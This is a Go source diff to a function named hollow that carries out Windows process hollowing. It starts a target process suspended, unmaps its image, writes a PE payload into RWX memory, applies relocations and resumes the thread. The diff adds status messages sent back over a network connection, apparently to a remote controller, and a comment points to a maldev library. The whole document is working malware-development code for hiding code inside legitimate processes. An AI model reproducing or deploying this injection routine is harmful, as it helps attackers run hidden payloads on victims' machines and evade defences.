@@ -30,9 +30,10 @@ const (
 
 // hollow starts the src process and injects the target process.
 func hollow(conn *net.Conn, sc []byte, filePath string) { //I am going to use file transfer over http from maldev library if shit continues this way
-	fmt.Println(len(sc))
+	//fmt.Println(len(sc))
 	cmd, err := syscall.UTF16PtrFromString(filePath)
 	if err != nil {
+		(*conn).Write([]byte("FAILURE\n"))
 		panic(err)
 	}
 
@@ -44,6 +45,7 @@ func hollow(conn *net.Conn, sc []byte, filePath string) { //I am going to use fi
 	// CREATE_SUSPENDED := 0x00000004
 	err = syscall.CreateProcess(cmd, nil, nil, nil, false, 0x00000004, nil, nil, si, pi)
 	if err != nil {
+		(*conn).Write([]byte("FAILURE\n"))
 		panic(err)
 	}
 
@@ -55,6 +57,7 @@ func hollow(conn *net.Conn, sc []byte, filePath string) { //I am going to use fi
 	Log("Getting thread context of %v", hThread)
 	ctx, err := GetThreadContext(hThread)
 	if err != nil {
+		(*conn).Write([]byte("FAILURE\n"))
 		panic(err)
 	}
 	// https://stackoverflow.com/questions/37656523/declaring-context-struct-for-pinvoke-windows-x64
@@ -65,6 +68,7 @@ func hollow(conn *net.Conn, sc []byte, filePath string) { //I am going to use fi
 	//https://bytepointer.com/resources/tebpeb64.htm
 	baseAddr, err := ReadProcessMemoryAsAddr(hProcess, uintptr(Rdx+16))
 	if err != nil {
+		(*conn).Write([]byte("FAILURE\n"))
 		panic(err)
 	}
 
@@ -77,6 +81,7 @@ func hollow(conn *net.Conn, sc []byte, filePath string) { //I am going to use fi
 
 	destPEReader := bytes.NewReader(destPE)
 	if err != nil {
+		(*conn).Write([]byte("FAILURE\n"))
 		panic(err)
 	}
 
@@ -85,12 +90,14 @@ func hollow(conn *net.Conn, sc []byte, filePath string) { //I am going to use fi
 	Log("Getting OptionalHeader of destination PE")
 	oh, ok := f.OptionalHeader.(*pe.OptionalHeader64)
 	if !ok {
+		(*conn).Write([]byte("FAILURE\n"))
 		panic("OptionalHeader64 not found")
 	}
 
 	Log("ImageBase of destination PE[OptionalHeader.ImageBase]: %x", oh.ImageBase)
 	Log("Unmapping view of section %x", baseAddr)
 	if err := NtUnmapViewOfSection(hProcess, baseAddr); err != nil {
+		(*conn).Write([]byte("FAILURE\n"))
 		panic(err)
 	}
 
@@ -100,12 +107,14 @@ func hollow(conn *net.Conn, sc []byte, filePath string) { //I am going to use fi
 	// PAGE_EXECUTE_READWRITE := 0x40
 	newImageBase, err := VirtualAllocEx(hProcess, baseAddr, oh.SizeOfImage, 0x00002000|0x00001000, 0x40)
 	if err != nil {
+		(*conn).Write([]byte("FAILURE\n"))
 		panic(err)
 	}
 	Log("New base address %x", newImageBase)
 	Log("Writing PE to memory in process at %x (size: %v)", newImageBase, oh.SizeOfHeaders)
 	err = WriteProcessMemory(hProcess, newImageBase, destPE, oh.SizeOfHeaders)
 	if err != nil {
+		(*conn).Write([]byte("FAILURE\n"))
 		panic(err)
 	}
 
@@ -113,10 +122,12 @@ func hollow(conn *net.Conn, sc []byte, filePath string) { //I am going to use fi
 		Log("Writing section[%v] to memory at %x (size: %v)", sec.Name, newImageBase+uintptr(sec.VirtualAddress), sec.Size)
 		secData, err := sec.Data()
 		if err != nil {
+			(*conn).Write([]byte("FAILURE\n"))
 			panic(err)
 		}
 		err = WriteProcessMemory(hProcess, newImageBase+uintptr(sec.VirtualAddress), secData, sec.Size)
 		if err != nil {
+			(*conn).Write([]byte("FAILURE\n"))
 			panic(err)
 		}
 	}
@@ -132,12 +143,14 @@ func hollow(conn *net.Conn, sc []byte, filePath string) { //I am going to use fi
 		Log("Locating relocation section")
 		relSec := findRelocSec(rel.VirtualAddress, f.Sections)
 		if relSec == nil {
+			(*conn).Write([]byte("FAILURE\n"))
 			panic(fmt.Sprintf(".reloc not found at %x", rel.VirtualAddress))
 		}
 		Log("Relocation section %x (size: %v)", relSec.VirtualAddress, relSec.Size)
 		var read uint32
 		d, err := relSec.Data()
 		if err != nil {
+			(*conn).Write([]byte("FAILURE\n"))
 			panic(err)
 		}
 		rr := bytes.NewReader(d)
@@ -159,11 +172,13 @@ func hollow(conn *net.Conn, sc []byte, filePath string) { //I am going to use fi
 					rell := newImageBase + uintptr(rrr.Offset()) + uintptr(dd.VirtualAddress)
 					raddr, err := ReadProcessMemoryAsAddr(hProcess, rell)
 					if err != nil {
+						(*conn).Write([]byte("FAILURE\n"))
 						panic(err)
 					}
 
 					err = WriteProcessMemoryAsAddr(hProcess, rell, uintptr(int64(raddr)+delta))
 					if err != nil {
+						(*conn).Write([]byte("FAILURE\n"))
 						panic(err)
 					}
 
@@ -179,6 +194,7 @@ func hollow(conn *net.Conn, sc []byte, filePath string) { //I am going to use fi
 	binary.LittleEndian.PutUint64(addrB, uint64(newImageBase))
 	err = WriteProcessMemory(hProcess, uintptr(Rdx+16), addrB, 8)
 	if err != nil {
+		(*conn).Write([]byte("FAILURE\n"))
 		panic(err)
 	}
 
@@ -188,15 +204,17 @@ func hollow(conn *net.Conn, sc []byte, filePath string) { //I am going to use fi
 	Log("Setting thread context %v", hThread)
 	err = SetThreadContext(hThread, ctx)
 	if err != nil {
+		(*conn).Write([]byte("FAILURE\n"))
 		panic(err)
 	}
 
 	Log("Resuming thread %v", hThread)
 	_, err = ResumeThread(hThread)
 	if err != nil {
+		(*conn).Write([]byte("FAILURE\n"))
 		panic(err)
 	}
-
+	(*conn).Write([]byte("OK\n"))
 }
 
 var (
